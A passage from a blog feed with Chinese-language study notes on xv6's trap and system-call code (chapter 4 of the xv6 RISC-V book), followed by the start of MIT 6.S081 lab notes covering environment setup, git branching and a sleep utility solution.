p-&gt;trapframe-&gt;a0</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        csrr t0, sscratch</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sd t0, 112(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # restore kernel stack pointer from p-&gt;trapframe-&gt;kernel_sp</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        ld sp, 8(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # make tp hold the current hartid, from p-&gt;trapframe-&gt;kernel_hartid</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        ld tp, 32(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # load the address of usertrap(), p-&gt;trapframe-&gt;kernel_trap</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        ld t0, 16(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # restore kernel page table from p-&gt;trapframe-&gt;kernel_satp</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        ld t1, 0(a0)</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        csrw satp, t1</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        sfence.vma zero, zero</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # a0 is no longer valid, since the kernel page</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # table does not specially map p-&gt;tf.</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        # jump to usertrap(), which does not return</span></span></span><br><span class="line"><span class="meta-string"><span class="meta">        jr t0</span></span></span><br><span class="line"><span class="meta-string"><span class="meta"></span></span></span><br></pre></td></tr></table></figure><p><code>uservec</code>启动时，所有32个寄存器都包含被中断代码所拥有的值。</p><p><code>uservec</code>开始时的<code>csrrw</code>指令交换了<code>a0</code>和<code>sscratch</code>的内容。现在用户代码的<code>a0</code>被保存了；<code>uservec</code>有一个寄存器（<code>a0</code>）可以使用；<code>a0</code>包含内核以前放在<code>sscratch</code>中的值。</p><blockquote><p>   这块先过，，，有点跟不懂</p></blockquote><h2 id="4-3-调用系统调用"><a href="#4-3-调用系统调用" class="headerlink" title="4.3 调用系统调用"></a>4.3 调用系统调用</h2><p>第二章的时候<strong>initcode.S</strong>调用<code>exec</code>系统调用后，看看用户调用是如何在内核中实现<code>exec</code>系统调用的。</p><p>用户代码将<code>exec</code>需要的参数放在寄存器<code>a0</code>和<code>a1</code>中，并将系统调用号放在<code>a7</code>中。</p><p><code>ecall</code>指令陷入(trap)到内核中，执行<code>uservec</code>、<code>usertrap</code>和<code>syscall</code>，和$(4.2)$步骤一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/syscall.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">syscall</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> num;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"></span><br><span class="line">num = p-&gt;trapframe-&gt;a7;</span><br><span class="line"><span class="keyword">if</span> (num &gt; <span class="number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num])</span><br><span class="line">&#123;</span><br><span class="line">p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">   p-&gt;pid, p-&gt;name, num);</span><br><span class="line">p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>syscall</code>首先从陷阱帧(trapframe)中保存的a7检索系统调用号，并用它索引到<code>syscalls</code>中，对于第一次系统调用，<code>a7</code>中的内容是<code>SYS_exec</code>（<strong>kernel&#x2F;syscall. h</strong>），导致了对系统调用接口函数<code>sys_exec</code>的调用。</p><p>当系统调用接口函数返回时，<code>syscall</code>将其返回值记录在<code>p-&gt;trapframe-&gt;a0</code>中。这将导致原始用户空间对<code>exec()</code>的调用返回该值，因为RISC-V上的C调用约定将返回值放在<code>a0</code>中。系统调用通常返回负数表示错误，返回零或正数表示成功。如果系统调用号无效，<code>syscall</code>打印错误并返回-1。</p><h2 id="4-4-系统调用参数"><a href="#4-4-系统调用参数" class="headerlink" title="4.4 系统调用参数"></a>4.4 系统调用参数</h2><p>函数<code>artint</code>、<code>artaddr</code>和<code>artfd</code>从陷阱框架中检索第n个<strong>系统调用参数</strong>并以整数、指针或文件描述符的形式保存。他们都调用<code>argraw</code>来检索相应的保存的用户寄存器（<strong>kernel&#x2F;syscall.c</strong>）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fetch the nth 32-bit system call argument.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">argint</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> *ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*ip = argraw(n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Retrieve an argument as a pointer.</span></span><br><span class="line"><span class="comment">// Doesn&#x27;t check for legality, since</span></span><br><span class="line"><span class="comment">// copyin/copyout will do that.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">argaddr</span><span class="params">(<span class="keyword">int</span> n, uint64 *ip)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">*ip = argraw(n);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Fetch the nth word-sized system call argument as a null-terminated string.</span></span><br><span class="line"><span class="comment">// Copies into buf, at most max.</span></span><br><span class="line"><span class="comment">// Returns string length if OK (including nul), -1 if error.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">argstr</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">char</span> *buf, <span class="keyword">int</span> max)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">uint64 addr;</span><br><span class="line"><span class="keyword">if</span> (argaddr(n, &amp;addr) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">return</span> fetchstr(addr, buf, max);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> uint64</span></span><br><span class="line"><span class="function"><span class="title">argraw</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"><span class="keyword">switch</span> (n)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> p-&gt;trapframe-&gt;a0;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">return</span> p-&gt;trapframe-&gt;a1;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line"><span class="keyword">return</span> p-&gt;trapframe-&gt;a2;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="keyword">return</span> p-&gt;trapframe-&gt;a3;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line"><span class="keyword">return</span> p-&gt;trapframe-&gt;a4;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line"><span class="keyword">return</span> p-&gt;trapframe-&gt;a5;</span><br><span class="line">&#125;</span><br><span class="line">panic(<span class="string">&quot;argraw&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内核实现了安全地将数据传输到用户提供的地址和从用户提供的地址传输数据的功能。<code>fetchstr</code>是一个例子（<strong>kernel&#x2F;syscall.c</strong>）。文件系统调用，如<code>exec</code>，使用<code>fetchstr</code>从用户空间检索字符串文件名参数。<code>fetchstr</code>调用<code>copyinstr</code>来完成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Fetch the nul-terminated string at addr from the current process.</span></span><br><span class="line"><span class="comment">// Returns length of string, not including nul, or -1 for error.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fetchstr</span><span class="params">(uint64 addr, <span class="keyword">char</span> *buf, <span class="keyword">int</span> max)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> =</span> myproc();</span><br><span class="line"><span class="keyword">int</span> err = copyinstr(p-&gt;pagetable, buf, addr, max);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">strlen</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>copyinstr</code>（<strong>kernel&#x2F;vm.c</strong>）从用户页表页表中的虚拟地址<code>srcva</code>复制<code>max</code>字节到<code>dst</code>。又调用<code>walk</code>遍历页表，以确定<code>srcva</code>的物理地址<code>pa0</code>。由于内核将所有物理RAM地址映射到同一个内核虚拟地址，<code>copyinstr</code>可以直接将字符串字节从<code>pa0</code>复制到<code>dst</code>。<code>walkaddr</code>（<strong>kernel&#x2F;vm.c</strong>）检查用户提供的虚拟地址是否为进程用户地址空间的一部分，因此程序不能欺骗内核读取其他内存。一个类似的函数<code>copyout</code>，将数据从内核复制到用户提供的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copy a null-terminated string from user to kernel.</span></span><br><span class="line"><span class="comment">// Copy bytes to dst from virtual address srcva in a given page table,</span></span><br><span class="line"><span class="comment">// until a &#x27;\0&#x27;, or max.</span></span><br><span class="line"><span class="comment">// Return 0 on success, -1 on error.</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copyinstr</span><span class="params">(<span class="keyword">pagetable_t</span> pagetable, <span class="keyword">char</span> *dst, uint64 srcva, uint64 max)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">uint64 n, va0, pa0;</span><br><span class="line"><span class="keyword">int</span> got_null = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (got_null == <span class="number">0</span> &amp;&amp; max &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">va0 = PGROUNDDOWN(srcva);</span><br><span class="line">pa0 = walkaddr(pagetable, va0);</span><br><span class="line"><span class="keyword">if</span> (pa0 == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">n = PGSIZE - (srcva - va0);</span><br><span class="line"><span class="keyword">if</span> (n &gt; max)</span><br><span class="line">n = max;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *p = (<span class="keyword">char</span> *)(pa0 + (srcva - va0));</span><br><span class="line"><span class="keyword">while</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (*p == <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">*dst = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">got_null = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">*dst = *p;</span><br><span class="line">&#125;</span><br><span class="line">--n;</span><br><span class="line">--max;</span><br><span class="line">p++;</span><br><span class="line">dst++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">srcva = va0 + PGSIZE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (got_null)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4-5-从内核空间陷入"><a href="#4-5-从内核空间陷入" class="headerlink" title="4.5 从内核空间陷入"></a>4.5 从内核空间陷入</h2><p>xv6根据执行的是用户代码还是内核代码，对CPU陷阱寄存器的配置有所不同。当在CPU上执行内核时，内核将<code>stvec</code>指向<code>kernelvec</code>(<strong>kernel&#x2F;kernelvec.S</strong>)的汇编代码。由于xv6已经在内核中，<code>kernelvec</code>可以依赖于设置为内核页表的<code>satp</code>，以及指向有效内核栈的栈指针。</p><p><code>Kernelvec</code>在保存寄存器后跳转到<code>kerneltrap</code>(<strong>kernel&#x2F;trap.c</strong>)。为两种类型的陷阱做好了准备：设备中断和异常。调用<code>devintr</code>(<strong>kernel&#x2F;trap.c</strong>)来检查和处理中断。如果陷阱不是设备中断，则必定是一个异常，内核中的异常将是一个致命的错误；内核调用<code>panic</code>并停止执行。</p><p>如果由于计时器中断而调用了<code>kerneltrap</code>，并且一个进程的内核线程正在运行（而不是调度程序线程），<code>kerneltrap</code>会调用<code>yield</code>，给其他线程一个运行的机会。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// interrupts and exceptions from kernel code go here via kernelvec,</span></span><br><span class="line"><span class="comment">// on whatever the current kernel stack is.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kerneltrap</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> which_dev = <span class="number">0</span>;</span><br><span class="line">uint64 sepc = r_sepc();</span><br><span class="line">uint64 sstatus = r_sstatus();</span><br><span class="line">uint64 scause = r_scause();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((sstatus &amp; SSTATUS_SPP) == <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kerneltrap: not from supervisor mode&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (intr_get() != <span class="number">0</span>)</span><br><span class="line">panic(<span class="string">&quot;kerneltrap: interrupts enabled&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((which_dev = devintr()) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;scause %p\n&quot;</span>, scause);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;sepc=%p stval=%p\n&quot;</span>, r_sepc(), r_stval());</span><br><span class="line">panic(<span class="string">&quot;kerneltrap&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line"><span class="keyword">if</span> (which_dev == <span class="number">2</span> &amp;&amp; myproc() != <span class="number">0</span> &amp;&amp; myproc()-&gt;state == RUNNING)</span><br><span class="line">yield();</span><br><span class="line"></span><br><span class="line"><span class="comment">// the yield() may have caused some traps to occur,</span></span><br><span class="line"><span class="comment">// so restore trap registers for use by kernelvec.S&#x27;s sepc instruction.</span></span><br><span class="line">w_sepc(sepc);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>kerneltrap</code>完成后，返回到任何被陷阱中断的代码。恢复这些控制寄存器并返回到<code>kernelvec</code>(<strong>kernel&#x2F;kernelvec.S</strong>)，之后<code>sret</code>，将<code>sepc</code>复制到<code>pc</code>并恢复中断的内核代码。</p><h1 id="Chapter-5-Interrupts-and-device-drivers"><a href="#Chapter-5-Interrupts-and-device-drivers" class="headerlink" title="Chapter 5:Interrupts and device drivers"></a>Chapter 5:Interrupts and device drivers</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;  英文版：&lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf&quot;&gt;https://pdos.csail.mit.edu/6.828/</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="OS" scheme="https://ghostasky.github.io/tags/OS/"/>
    
  </entry>
  
  <entry>
    <title>MIT6S081lab</title>
    <link href="https://ghostasky.github.io/2022/07/10/2022-7-10-oslab/"/>
    <id>https://ghostasky.github.io/2022/07/10/2022-7-10-oslab/</id>
    <published>2022-07-09T16:00:00.000Z</published>
    <updated>2022-09-28T13:48:24.610Z</updated>
    
    <content type="html"><![CDATA[<p>写oslab的一些代码，</p><blockquote><p>  xv6中文文档：<a href="https://th0ar.gitbooks.io/xv6-chinese/content/content/chapter2.html">https://th0ar.gitbooks.io/xv6-chinese/content/content/chapter2.html</a></p></blockquote><p>[toc]</p><h1 id="进度"><a href="#进度" class="headerlink" title="进度"></a>进度</h1><p>进度：</p><table><thead><tr><th align="left">lab_num&#x2F;lab_name</th><th align="left">Is it completed</th></tr></thead><tbody><tr><td align="left">Lab1&#x2F;sleep</td><td align="left">Finish</td></tr><tr><td align="left">Lab1&#x2F;pingpong</td><td align="left">Finish</td></tr><tr><td align="left">Lab1&#x2F;prime</td><td align="left">Finish</td></tr><tr><td align="left">Lab1&#x2F;find</td><td align="left"></td></tr><tr><td align="left">Lab1&#x2F;xargs</td><td align="left"></td></tr><tr><td align="left">Lab2&#x2F;trace</td><td align="left">Finish</td></tr><tr><td align="left">Lab2&#x2F;sysinfo</td><td align="left">Finish</td></tr><tr><td align="left">Lab3&#x2F;vmprint</td><td align="left">Finish</td></tr></tbody></table><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>之前搞到一半，，环境有点问题，想着重新搞个虚拟机写os的lab</p><p>依赖，源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git build-essential gdb-multiarch qemu-system-misc gcc-riscv64-linux-gnu binutils-riscv64-linux-gnu </span><br><span class="line"></span><br><span class="line">sudo apt-get remove qemu-system-misc</span><br><span class="line">sudo apt-get install qemu-system-misc=1:4.2-3ubuntu6</span><br><span class="line">sudo apt install gcc-riscv64-unknown-elf</span><br><span class="line">git clone git://g.csail.mit.edu/xv6-labs-2020</span><br></pre></td></tr></table></figure><p>有如下分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">yutao@ubuntu:~/xv6-labs-2020$ git branch  --remote</span><br><span class="line">  origin/HEAD -&gt; origin/master</span><br><span class="line">  origin/cow</span><br><span class="line">  origin/fs</span><br><span class="line">  origin/lazy</span><br><span class="line">  origin/lock</span><br><span class="line">  origin/master</span><br><span class="line">  origin/mmap</span><br><span class="line">  origin/net</span><br><span class="line">  origin/pgtbl</span><br><span class="line">  origin/riscv</span><br><span class="line">  origin/syscall</span><br><span class="line">  origin/thread</span><br><span class="line">  origin/traps</span><br><span class="line">  origin/util</span><br></pre></td></tr></table></figure><p>调试的话要在Makefile里加：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">gdb:</span></span><br><span class="line">riscv64-unknown-elf-gdb kernel/kernel</span><br></pre></td></tr></table></figure><p>调试的话：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch  kernel/kernel</span><br><span class="line">make qemu-gdb</span><br></pre></td></tr></table></figure><p>评测脚本grade-lab-util是python程序，这里对第一行进行修改，将</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PYTHON</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br></pre></td></tr></table></figure><p>修改为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PYTHON</span><br><span class="line"><span class="comment">#!/usr/bin python</span></span><br></pre></td></tr></table></figure><p>还要再Makefile里面加。</p><h2 id="分支建议："><a href="#分支建议：" class="headerlink" title="分支建议："></a>分支建议：</h2><p>(6). <strong>xv6实验git分支建议</strong></p><p>建议是每个实验创建一个测试分支，例如对于<strong>util</strong>来说</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout util         <span class="comment"># 切换到util分支</span></span><br><span class="line">git checkout -b util_test <span class="comment"># 建立并切换到util的测试分支</span></span><br></pre></td></tr></table></figure><p>当你在**<em>util_test*<strong>分支中每测试通过一个作业，请提交（<code>git commit</code>）你的代码，并将所做的修改合并（<code>git merge</code>）到</strong></em>util***中，然后提交（<code>git push</code>）到github</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;完成了第一个作业&quot;</span></span><br><span class="line">git checkout util</span><br><span class="line">git merge util_test</span><br><span class="line">git push github util:util</span><br></pre></td></tr></table></figure><h1 id="lab1"><a href="#lab1" class="headerlink" title="lab1"></a>lab1</h1><p>实验指导书：<a href="https://pdos.csail.mit.edu/6.828/2020/labs/util.html">https://pdos.csail.mit.edu/6.828/2020/labs/util.html</a></p><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><p>代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please enter a number!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        n = atoi( argv[<span class="number">1</span>]);</span><br><span class="line">        sleep(n);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">yutao@ubuntu:~/xv6-<span class="built_in">labs</span><span class="number">-2020</span>$ sudo python3 grade-lab-util sleep</span><br><span class="line">make: <span class="string">&#x27;kernel/kernel&#x27;</span> is up to date.</span><br><span class="line">== Test sleep, no arguments == sleep, no arguments: OK (<span class="number">1.6</span>s) </span><br><span class="line">== Test sleep, returns == sleep, returns: OK (<span class="number">1.0</span>s) </span><br><span class="line">== Test sleep, makes syscall == sleep, makes syscall: OK (<span class="number">0.9</span>s) </span><br></pre></td></tr></table></figure><h2 id="pingpong"><a href="#pingpong" class="headerlink" title="pingpong"></a>pingpong</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 